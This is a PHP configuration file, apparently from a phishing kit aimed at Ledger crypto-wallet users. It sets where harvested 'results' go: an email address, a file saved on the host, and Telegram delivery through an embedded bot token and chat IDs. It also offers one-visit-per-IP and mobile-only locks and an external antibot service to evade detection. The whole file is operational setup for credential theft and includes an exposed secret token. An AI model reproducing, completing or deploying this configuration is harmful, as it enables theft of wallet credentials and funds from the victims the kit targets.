<?php
// @biden89 on telegram
error_reporting(0);

$to = 'test@test.com'; // the email to send the results to

$saveonhost = 1; // Save a copy of the results on hosting // 1 for enable and 0 for disable

// make sure to change the file name
$saveonhost_filename = 'Ledger_info_b57y8iuoijpoYU.txt'; // Save a copy of the results on hosting // 1 for enable and 0 for disable

$One_Time_Access = 0; // only one visitor from each ip // 1 for enable and 0 for disable
$mobile_lock = 0; // allow only mobile devices to login // 1 to enable and 0 to disable

/*
****** highly recommended ******
External Antibots {read description on the right of each}
*/

$enable_antibot = 0; // this one uses antibot.pw blocker // 1 to enable and 0 to disable
$antibot_key = ''; // external blocker api key u get from here after u topup your balance https://antibot.pw/dashboard/developers  [ required if antibot is enabled ]

$telegram_delivery = 1; //1 for enable and 0 for disable
$bot_token = '8295719728:AAHAk8r-wrClpJ5fDsh8W3gN8bUwF7CcmHg'; // 1123123123:xxxxxxxxxxxxxxxxxxxxxxxxxxx from @botfather
$chat_ids = ['-5036753122', '1809641816']; // Multiple chat IDs in an array


?>